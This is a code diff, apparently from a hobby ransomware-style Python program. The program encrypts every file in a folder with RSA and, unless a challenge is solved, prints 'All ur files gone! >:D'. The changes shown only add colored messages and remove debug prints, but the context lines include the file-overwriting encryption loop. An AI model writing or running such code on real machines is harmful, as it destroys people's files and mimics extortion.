@@ -6,7 +6,7 @@ from typing import Callable
 
 import rsa
 import colorama
-from colorama import Fore
+from colorama import Fore, Back
 
 from utils import cli
 from utils import key_manager
@@ -24,7 +24,6 @@ class EncrypterThread(threading.Thread):
 
             sleep(1)
             if self._stop:
-                print("Encrypshion was stoped")
                 return
 
             with open(f"{self._dir}\\{file}", "rb") as f:
@@ -34,7 +33,7 @@ class EncrypterThread(threading.Thread):
                 f.write(data)
 
             print(
-                f"File {file} was encruptad! Files left {files_count-file_num-1}/{files_count}"
+                f"{Fore.LIGHTRED_EX}File {file} was encruptad! Files left {files_count-file_num-1}/{files_count}"
             )
 
     def stop(self):
@@ -67,7 +66,6 @@ def main() -> None:
     if solved:
         files_count: int = len(os.listdir(files_path))
         for file_num, file in enumerate(os.listdir(files_path)):
-            print(f"{files_path}\\{file}")
             with open(f"{files_path}\\{file}", "rb") as f:
                 try:
                     data = rsa.decrypt(f.read(), private_key)
@@ -78,8 +76,16 @@ def main() -> None:
                         df.write(data)
 
             print(
-                f"File {file} was decruptad! Files left {files_count-file_num-1}/{files_count}"
+                f"{Fore.LIGHTGREEN_EX}File {file} was decruptad! Files left {files_count-file_num-1}/{files_count}"
             )
+        print(
+            f"{Fore.BLACK}{Back.LIGHTGREEN_EX}   U successfully decrupt ur files!   "
+        )
+
+    else:
+        print(
+            f"{Fore.BLACK}{Back.LIGHTRED_EX}   All ur files gone! >:D   "
+        )
 
 
 if __name__ == "__main__":
